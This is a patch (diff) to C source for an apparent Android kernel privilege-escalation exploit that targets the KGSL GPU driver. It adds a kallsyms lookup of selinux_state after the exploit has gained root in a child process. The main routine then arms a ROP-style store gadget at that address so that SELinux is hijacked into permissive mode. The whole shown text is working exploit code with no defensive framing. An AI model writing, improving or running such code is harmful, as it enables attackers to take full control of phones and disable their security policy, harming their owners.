@@ -117,6 +117,8 @@ struct ctrl {
     volatile int sec_probe_result;
     volatile int sec_scan_stop;
     volatile uint64_t sec_fake_addr;   /* kernel VA of the forged security struct */
+    volatile uint64_t sec_state_addr;  /* kallsyms-resolved selinux_state */
+    volatile int perm_go;
     char sec_ctx[128];
     int sec_errno[12];
 };
@@ -811,7 +813,7 @@ static uint64_t sec_perm_arm(
         int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
         unsigned dump_id, uint64_t dump_gpu, void *dump_vma,
         const struct found *root_child, uint64_t task,
-        int trigger) {
+        uint64_t state_override, int trigger) {
     if (!g_target->kernel_text_va || !g_target->selinux_state_off ||
         !g_target->task_cpu_context || !g_target->task_fpsimd ||
         !g_target->switch_continuation_off ||
@@ -854,7 +856,8 @@ static uint64_t sec_perm_arm(
     }
 
     uint64_t run_text = text + kaslr;
-    uint64_t state = run_text + g_target->selinux_state_off;
+    uint64_t state = state_override ? state_override
+                                    : run_text + g_target->selinux_state_off;
     uint64_t store_gadget = run_text + g_target->gadget_store_off;
     uint64_t switch_return = run_text + g_target->gadget_switch_return_off;
 
@@ -969,6 +972,25 @@ static const char *resolve_ksud(const char *pkg, char *buf, size_t bufsz) {
 
 static void setenforce_permissive(void);
 static void run_policy_fix(void);
+
+static uint64_t kallsyms_lookup_name(const char *want) {
+    FILE *f = fopen("/proc/kallsyms", "r");
+    if (!f) return 0;
+    char line[512];
+    uint64_t found = 0;
+    while (fgets(line, sizeof(line), f)) {
+        unsigned long long addr;
+        char type, name[256];
+        if (sscanf(line, "%llx %c %255s", &addr, &type, name) != 3)
+            continue;
+        if (addr && strcmp(name, want) == 0) {
+            found = addr;
+            break;
+        }
+    }
+    fclose(f);
+    return found;
+}
 
 static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
     if (prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) < 0 ||
@@ -1314,6 +1336,15 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
         }
         for (;;) pause();
     }
+    if (ctrls[idx].daemon_abort) _exit(127);
+
+    /* selinux_state moves between firmware builds.  Resolve it now that
+     * this task has root, then park so the parent arms the store at the
+     * real address instead of the build's fixed profile offset. */
+    ctrls[idx].sec_state_addr = kallsyms_lookup_name("selinux_state");
+    __sync_synchronize();
+    while (!ctrls[idx].perm_go && !ctrls[idx].daemon_abort)
+        futex_wait_int(&ctrls[idx].perm_go, 0);
     if (ctrls[idx].daemon_abort) _exit(127);
 
     setenforce_permissive();
@@ -2731,27 +2762,10 @@ int main(int argc, char **argv) {
                wname ? wname : "");
     }
     uint64_t hijack_kaslr = 0;
-    if (sec_perm_mode) {
-        int trigger = env_flag("SEC_PERM_TRIGGER", 1);
-        if (wait_child_parked(root_child.pid, 2000) < 0)
-            fprintf(stderr, "[*] child %d not parked; arming anyway\n",
-                    root_child.pid);
-        for (int arm = 0; arm < 3 && !hijack_kaslr; arm++) {
-            hijack_kaslr = sec_perm_arm(fd, ctx, ib_id, ib_gpu, ib_vma,
-                                        dump_id, dump_gpu, dump_vma,
-                                        &root_child, root_task_kva, trigger);
-            if (!hijack_kaslr && !trigger)
-                break;
-            if (!hijack_kaslr)
-                usleep(1000);
-        }
-        if (!hijack_kaslr)
-            fprintf(stderr,
-                    "[-] permissive hijack not armed; child will resume"
-                    " normally\n");
-    }
     ctrls[root_child.idx].root_done = 0;
     ctrls[root_child.idx].error = 0;
+    ctrls[root_child.idx].sec_state_addr = 0;
+    ctrls[root_child.idx].perm_go = 0;
     ctrls[root_child.idx].action = 1;
     __sync_synchronize();
     futex_wake_int(&ctrls[root_child.idx].action);
@@ -2762,6 +2776,43 @@ int main(int argc, char **argv) {
     }
     printf("[+] child %d verified uid/euid/gid/egid 0\n", root_child.pid);
     mark("root verified");
+    uint64_t state_va = 0;
+    if (sec_perm_mode) {
+        for (int i = 0; i < 300 && !state_va; i++) {
+            __sync_synchronize();
+            state_va = ctrls[root_child.idx].sec_state_addr;
+            if (!state_va) usleep(10000);
+        }
+        if (state_va)
+            printf("[*] kallsyms selinux_state=%016llx\n",
+                   (unsigned long long)state_va);
+        else
+            fprintf(stderr, "[*] kallsyms selinux_state unavailable; using"
+                            " profile offset\n");
+        int trigger = env_flag("SEC_PERM_TRIGGER", 1);
+        if (wait_child_parked(root_child.pid, 2000) < 0)
+            fprintf(stderr, "[*] child %d not parked; arming anyway\n",
+                    root_child.pid);
+        for (int arm = 0; arm < 3 && !hijack_kaslr; arm++) {
+            hijack_kaslr = sec_perm_arm(fd, ctx, ib_id, ib_gpu, ib_vma,
+                                        dump_id, dump_gpu, dump_vma,
+                                        &root_child, root_task_kva,
+                                        state_va, trigger);
+            if (!hijack_kaslr && !trigger)
+                break;
+            if (!hijack_kaslr)
+                usleep(1000);
+        }
+        if (!hijack_kaslr)
+            fprintf(stderr,
+                    "[-] permissive hijack not armed; child will resume"
+                    " normally\n");
+    }
+    ctrls[root_child.idx].perm_go = 1;
+    __sync_synchronize();
+    futex_wake_int(&ctrls[root_child.idx].perm_go);
+    for (int i = 0; i < 100 && sec_read_enforce() != 0; i++)
+        usleep(10000);
     if (sec_perm_mode) sec_report_permissive(hijack_kaslr, root_child.pid);
     if (sec_perm_mode && hijack_kaslr && sec_read_enforce() != 0) {
         char next[16];
